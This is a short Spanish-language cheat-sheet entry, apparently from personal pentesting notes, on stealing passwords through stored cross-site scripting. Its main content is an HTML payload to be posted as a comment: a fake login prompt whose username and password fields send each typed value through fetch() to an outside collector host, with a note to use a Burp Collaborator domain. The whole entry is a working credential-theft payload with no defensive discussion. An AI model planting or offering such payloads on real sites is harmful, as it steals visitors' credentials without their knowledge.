# Captura de contraseñas mediante XSS almacenado 

Tags: #XSS  #JavaScript 

```bash 
// Se debe de usar BurpSuite Collaborator para obtener el dominio y crear una plantilla en HTML en el comentario del post 
```

```html
Introduce tus credenciales para ver el post:<br><br>

Usuario: <input name=username id=username onchange="fetch('https://website.com?username' + this.value)"><br><br>
Password: <input name=password id=password type=password onchange="fetch('https://website.com?password' + this.value)">
```